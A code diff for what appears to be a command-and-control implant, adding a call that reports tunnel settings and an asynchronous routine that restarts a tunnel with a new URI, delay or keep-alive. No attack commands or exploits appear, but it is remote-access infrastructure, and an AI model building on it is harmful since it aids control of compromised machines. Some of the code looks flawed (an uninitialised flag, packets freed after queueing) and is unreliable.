@@ -54,6 +54,10 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        NET_BASE, \
                        API_CALL + 4)
+#define NET_GET_TUNNEL \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       NET_BASE, \
+                       API_CALL + 5)
 
 #define NET_CLIENT_PIPE \
         TLV_PIPE_CUSTOM(PIPE_STATIC, \
@@ -69,6 +73,21 @@
 
 static tlv_pkt_t *net_tunnels(c2_t *c2)
 {
+    /* List current active network tunnels.
+     *
+     * :out tlv(TLV_TYPE_GROUP): list of tunnels
+     *      :member u32(TLV_TYPE_TUNNEL_ID): tunnel ID
+     *      :member u32(TLV_TYPE_TUNNEL_ALGO): encryption algorithm ID
+     *      :member string(TLV_TYPE_TUNNEL_URI): tunnel URI
+     *      :member u32(TLV_TYPE_BOOL): is current tunnel
+     *      :member u32(TLV_TYPE_INT): is active or suspended
+     *      :member u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): should be kept alive after exit or not
+     *      :member u32(TLV_TYPE_TUNNEL_DELAY): keep alive delay
+     *
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     *
+     */
+
     c2_t *curr_c2;
     c2_t *c2_tmp;
     core_t *core;
@@ -108,6 +127,13 @@ static tlv_pkt_t *net_tunnels(c2_t *c2)
 
 tlv_pkt_t *net_add_tunnel(c2_t *c2)
 {
+    /* Add new network tunnel.
+     *
+     * :in string(TLV_TYPE_TUNNEL_URI): new tunnel URI
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     *
+     */
+
     core_t *core;
     char uri[256];
 
@@ -124,6 +150,13 @@ tlv_pkt_t *net_add_tunnel(c2_t *c2)
 
 tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
 {
+    /* Suspend network tunnel by ID.
+     *
+     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     *
+     */
+
     core_t *core;
     c2_t *curr_c2;
     c2_t *c2_tmp;
@@ -153,6 +186,13 @@ tlv_pkt_t *net_suspend_tunnel(c2_t *c2)
 
 tlv_pkt_t *net_activate_tunnel(c2_t *c2)
 {
+    /* Activate network tunnel by ID.
+     *
+     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     *
+     */
+
     core_t *core;
     c2_t *curr_c2;
     c2_t *c2_tmp;
@@ -174,21 +214,30 @@ tlv_pkt_t *net_activate_tunnel(c2_t *c2)
     return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
-tlv_pkt_t *net_restart_tunnel(c2_t *c2)
+static void update_tunnel(struct eio_req *request)
 {
-    core_t *core;
+    c2_t *c2;
     c2_t *curr_c2;
     c2_t *c2_tmp;
+    core_t *core;
 
     int id;
     int delay;
     int keep_alive;
+    int found;
+    int status;
 
+    char uri[256];
+
+    c2 = request->data;
     core = c2->data;
 
-    tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_DELAY, &delay);
-    tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_ID, &id);
-    tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_KEEP_ALIVE, &keep_alive);
+    status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_ID, &id);
+
+    if (status == -1)
+    {
+        goto fail;
+    }
 
     HASH_ITER(hh, core->c2, curr_c2, c2_tmp)
     {
@@ -197,15 +246,68 @@ tlv_pkt_t *net_restart_tunnel(c2_t *c2)
             continue;
         }
 
-        curr_c2->tunnel->delay = (float)delay;
-        log_debug("* Delay: %f | %s\n", curr_c2->tunnel->delay, curr_c2->tunnel->uri);
-        curr_c2->tunnel->keep_alive = keep_alive;
+        c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+        c2_enqueue_tlv(c2, c2->response);
+        found = 1;
+
+        tunnel_stop(curr_c2->tunnel);
+        status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_DELAY, &delay);
+
+        if (status != -1)
+        {
+            curr_c2->tunnel->delay = (float)delay;
+            log_debug("* Delay: %f | %s\n", curr_c2->tunnel->delay, curr_c2->tunnel->uri);
+        }
+
+        status = tlv_pkt_get_u32(c2->request, TLV_TYPE_TUNNEL_KEEP_ALIVE, &keep_alive);
+
+        if (status != -1)
+        {
+            curr_c2->tunnel->keep_alive = keep_alive;
+        }
+
+        status = tlv_pkt_get_string(c2->request, TLV_TYPE_TUNNEL_URI, uri);
+
+        if (status != -1)
+        {
+            free(curr_c2->tunnel->uri);
+            tunnel_set_uri(curr_c2->tunnel, uri);
+        }
 
         tunnel_start(curr_c2->tunnel);
         break;
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+    if (!found)
+    {
+        goto fail;
+    }
+
+    goto finalize;
+
+fail:
+    c2->response = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    c2_enqueue_tlv(c2, c2->response);
+
+finalize:
+    tlv_pkt_destroy(c2->request);
+    tlv_pkt_destroy(c2->response);
+}
+
+tlv_pkt_t *net_restart_tunnel(c2_t *c2)
+{
+    /* Restart and update network tunnel configuration by ID.
+     *
+     * :in u32(TLV_TYPE_TUNNEL_ID): tunnel ID
+     * :in u32(TLV_TYPE_TUNNEL_DELAY): new tunnel keep alive delay
+     * :in u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): toggle keep alive
+     * :in string(TLV_TYPE_TUNNEL_URI): new tunnel URI
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
+     *
+     */
+
+    eio_custom(update_tunnel, 0, NULL, c2);
+    return NULL;
 }
 
 void net_client_event_link(int event, void *data)
@@ -338,10 +440,41 @@ static int net_client_destroy(pipe_t *pipe, c2_t *c2)
     tunnel_t *tunnel;
 
     tunnel = pipe->data;
+
+    tunnel_stop(tunnel);
     tunnel_exit(tunnel);
     tunnel_free(tunnel);
 
     return 0;
+}
+
+static tlv_pkt_t *net_get_tunnel(c2_t *c2)
+{
+    /* Retrieve current network tunnel configuration.
+     *
+     * :out u32(TLV_TYPE_TUNNEL_ID): current tunnel ID
+     * :out u32(TLV_TYPE_TUNNEL_ALGO): current tunnel encryption algorithm ID
+     * :out u32(TLV_TYPE_TUNNEL_DELAY): current tunnel keep alive delay
+     * :out u32(TLV_TYPE_TUNNEL_KEEP_ALIVE): is keep alive or not
+     * :out string(TLV_TYPE_TUNNEL_URI): current tunnel URI
+     * :out u32(TLV_TYPE_INT): is current tunnel active (it should be!)
+     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS
+     *
+     */
+
+    tlv_pkt_t *result;
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+
+    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_ID, c2->id);
+    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_ALGO, c2->crypt->algo);
+    tlv_pkt_add_string(result, TLV_TYPE_TUNNEL_URI, c2->tunnel->uri);
+
+    tlv_pkt_add_u32(result, TLV_TYPE_INT, c2->tunnel->active);
+    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_KEEP_ALIVE, c2->tunnel->keep_alive);
+    tlv_pkt_add_u32(result, TLV_TYPE_TUNNEL_DELAY, (int)c2->tunnel->delay);
+
+    return result;
 }
 
 void register_net_api_calls(api_calls_t **api_calls)
@@ -351,6 +484,7 @@ void register_net_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, NET_SUSPEND_TUNNEL, net_suspend_tunnel);
     api_call_register(api_calls, NET_ACTIVATE_TUNNEL, net_activate_tunnel);
     api_call_register(api_calls, NET_RESTART_TUNNEL, net_restart_tunnel);
+    api_call_register(api_calls, NET_GET_TUNNEL, net_get_tunnel);
 }
 
 void register_net_api_pipes(pipes_t **pipes)
